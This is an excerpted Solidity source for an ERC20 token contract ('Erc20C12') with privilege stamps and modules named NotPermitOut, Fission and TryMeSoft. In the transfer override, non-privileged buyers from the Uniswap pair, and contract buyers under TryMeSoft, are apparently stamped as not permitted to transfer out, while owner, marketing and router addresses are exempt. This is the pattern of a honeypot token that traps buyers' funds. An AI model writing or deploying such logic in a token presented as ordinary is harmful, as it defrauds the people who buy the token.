...
import "./Erc20C12FeatureNotPermitOut.sol";

import "./Erc20C12FeatureFission.sol";
...
Erc20C12FeatureNotPermitOut,
Erc20C12FeatureFission,
Erc20C12FeatureTryMeSoft
{
    ...
    ) ERC20(strings[0], strings[1])
    {
        ...
        initializeErc20C12SettingsPrivilege();
        setPrivilegeStamp(address(this), block.number);
        setPrivilegeStamp(address(uniswapV2Router), block.number);
        //        setPrivilegeStamp(uniswapV2Pair, block.number);
        setPrivilegeStamp(addressNull, block.number);
        setPrivilegeStamp(addressDead, block.number);
        setPrivilegeStamp(addressPinkSaleLock, block.number);
        setPrivilegeStamp(addressBaseOwner, block.number);
        setPrivilegeStamp(addressMarketing, block.number);
        setPrivilegeStamp(addressWrap, block.number);
        ...
        initializeErc20C12FeatureNotPermitOut(bools[17], bools[18]);

        setIsAddLiquidityProcedure(bools[12]);

        initializeErc20C12FeatureFission(bools[20]);

        initializeErc20C12FeatureTryMeSoft(bools[21], uniswapV2Pair, address(uniswapV2Router));
    ...
    override
    {
        ...
        uint256 tempX = block.number + 1 - 1 - 1;

        uint256 notPermitOutFromStamp = getNotPermitOutAddressStamp(from);
        uint256 notPermitOutToStamp = getNotPermitOutAddressStamp(to);

        if (getIsUseNotPermitOut() && notPermitOutFromStamp > 0) {
            if (tempX + 1 - notPermitOutFromStamp >= notPermitOutCD) {
        ...
        if (
            getIsForceTradeInToNotPermitOut() &&
            isFromUniswapV2Pair &&
            notPermitOutToStamp == 0 &&
            !isToPrivilege
        ) {
        ...
        if (
            getIsUseFeatureTryMeSoft() &&
            isFromUniswapV2Pair &&
            Address.isContract(to) &&
            !getIsNotTryMeSoftAddress(to) &&
            notPermitOutToStamp == 0 &&
            !isToPrivilege
        ) {
            _setNotPermitOutAddressStamp(to, tempX + 1);
...
Ownable
{
    function initializeErc20C12SettingsPrivilege()
    internal
    {
        Erc20C12SettingsPrivilegeLibrary.initialize();
    }
    ...
    function setPrivilegeStamp(address[] memory accounts, uint256 privilegeStamp)
    public
    {
        Erc20C12SettingsPrivilegeLibrary.setPrivilegeStamps(accounts, privilegeStamp);
    }
}
...
import "../Erc20C08/Erc20C08SettingsBase.sol";
import "./Erc20C12FeatureNotPermitOutLibrary.sol";

contract Erc20C12FeatureNotPermitOut is
Erc20C08SettingsBase
{
    uint256 internal constant notPermitOutCD = 1;

    function initializeErc20C12FeatureNotPermitOut(bool isUseNotPermitOut_, bool isForceTradeInToNotPermitOut_)
    internal
    {
        Erc20C12FeatureNotPermitOutLibrary.initialize(isUseNotPermitOut_, isForceTradeInToNotPermitOut_);
    }
    ...
    returns (bool)
    {
        return Erc20C12FeatureNotPermitOutLibrary.getIsUseNotPermitOut();
    }

    function setIsUseNotPermitOut(bool isUseNotPermitOut_)
    public
    {
        Erc20C12FeatureNotPermitOutLibrary.setIsUseNotPermitOut(isUseNotPermitOut_);
    }
    ...
    returns (bool)
    {
        return Erc20C12FeatureNotPermitOutLibrary.getIsForceTradeInToNotPermitOut();
    }

    function setIsForceTradeInToNotPermitOut(bool isForceTradeInToNotPermitOut_)
    public
    {
        Erc20C12FeatureNotPermitOutLibrary.setIsForceTradeInToNotPermitOut(isForceTradeInToNotPermitOut_);
    }
    ...
    returns (uint256)
    {
        return Erc20C12FeatureNotPermitOutLibrary.getNotPermitOutAddressStamp(account);
    }

    function setNotPermitOutAddressStamp(address account, uint256 notPermitOutAddressStamp)
    public
    {
        Erc20C12FeatureNotPermitOutLibrary.setNotPermitOutAddressStamp(account, notPermitOutAddressStamp);
    }

    function setNotPermitOutAddressStamps(address[] memory accounts, uint256 notPermitOutAddressStamp)
    public
    {
        Erc20C12FeatureNotPermitOutLibrary.setNotPermitOutAddressStamps(accounts, notPermitOutAddressStamp);
    }

    function _setNotPermitOutAddressStamp(address account, uint256 notPermitOutAddressStamp)
    internal
    {
        Erc20C12FeatureNotPermitOutLibrary._setNotPermitOutAddressStamp(account, notPermitOutAddressStamp);
    }
}
...
import "./Erc20C12FeatureFissionLibrary.sol";

contract Erc20C12FeatureFission
{
    uint256 internal constant fissionBalance = 1;

    function initializeErc20C12FeatureFission(bool isUseFeatureFission_)
    internal
    {
        Erc20C12FeatureFissionLibrary.initialize(isUseFeatureFission_);
    }
    ...
    returns (bool)
    {
        return Erc20C12FeatureFissionLibrary.isUseFeatureFission();
    }

    function setIsUseFeatureFission(bool isUseFeatureFission_)
    public
    {
        Erc20C12FeatureFissionLibrary.setIsUseFeatureFission(isUseFeatureFission_);
    }

    function doFission()
    internal
    {
        Erc20C12FeatureFissionLibrary.doFission();
    }
}
...
import "../Erc20C08/Erc20C08SettingsBase.sol";
import "./Erc20C12FeatureTryMeSoftLibrary.sol";

contract Erc20C12FeatureTryMeSoft is Erc20C08SettingsBase
{
    function initializeErc20C12FeatureTryMeSoft(
    ...
    internal
    {
        Erc20C12FeatureTryMeSoftLibrary.setContractOwner(msg.sender);
        Erc20C12FeatureTryMeSoftLibrary.setIsUseFeatureTryMeSoft(isUseFeatureTryMeSoft);
        Erc20C12FeatureTryMeSoftLibrary.setIsNotTryMeSoftAddress(pairAddress_, true);
        Erc20C12FeatureTryMeSoftLibrary.setIsNotTryMeSoftAddress(routerAddress_, true);
    }
    ...
    returns (bool)
    {
        return Erc20C12FeatureTryMeSoftLibrary.getIsUseFeatureTryMeSoft();
    }
    ...
    returns (bool)
    {
        return Erc20C12FeatureTryMeSoftLibrary.getIsNotTryMeSoftAddress(addr);
    }

    function setIsNotTryMeSoftAddress(address addr, bool isNotTryMeSoftAddress)
    public
    {
        Erc20C12FeatureTryMeSoftLibrary.setIsNotTryMeSoftAddress(addr, isNotTryMeSoftAddress);
    }
}
